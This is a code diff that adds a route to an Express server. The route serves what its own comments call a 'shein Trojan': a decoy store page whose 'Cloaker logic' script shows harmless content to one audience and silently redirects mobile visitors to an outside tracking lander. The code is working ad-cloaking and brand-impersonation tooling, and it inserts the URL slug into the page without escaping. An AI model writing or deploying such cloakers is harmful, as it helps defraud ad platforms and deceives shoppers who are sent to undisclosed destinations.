@@ -272,6 +272,40 @@ app.get('/sheinca/:slug', (req, res, next) => {
             console.log(`Served shein Trojan (maxconvtest)(${slug})`);
 });
 
+// Middleware to pass on my slug values to MaxConv (SHEIN AU CAMP)
+app.get('/sheinau/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://klcxb6.mcgo2.com/visit/8584e0ec-eef7-4bd2-b0c3-f61d8cf8cf73?slug=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to the new ${slug} Store!</h1>
+            <p>We hope you enjoy ${slug}'s best products.</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served shein Trojan (maxconvtest)(${slug})`);
+});
+
+
 // Middleware to pass on my slug values to MaxConv (SEPHORA CAMP)
 app.get('/sephora/:slug', (req, res, next) => {
     const { slug } = req.params;
